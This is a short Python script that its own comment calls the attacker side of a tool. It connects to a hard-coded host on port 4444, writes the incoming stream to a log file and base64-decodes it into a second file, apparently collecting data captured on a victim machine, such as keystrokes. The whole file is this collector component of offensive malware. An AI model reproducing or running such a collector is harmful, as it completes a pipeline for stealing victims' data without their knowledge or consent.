import socket, sys, threading
from src import base64cipher
from time import sleep

host, port = '192.168.1.177', 4444


# This class describe the attacker side
def decode_text():
    f_log = open('log.txt', 'r')
    f_decrypt = open('decrypt_log.txt', 'a')
    for line in f_log:
        f_decrypt.write(base64cipher.decodeMsg(line))


class recv_data:
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.connect((host, port))

    def __init__(self):
        data = self.mysocket.recv(1024)
        f = open('log.txt', 'wb')
        while data != bytes(''.encode()):
            # print(data)
            f.write(data)
            data = self.mysocket.recv(1024)
        decode_text()


re = recv_data()
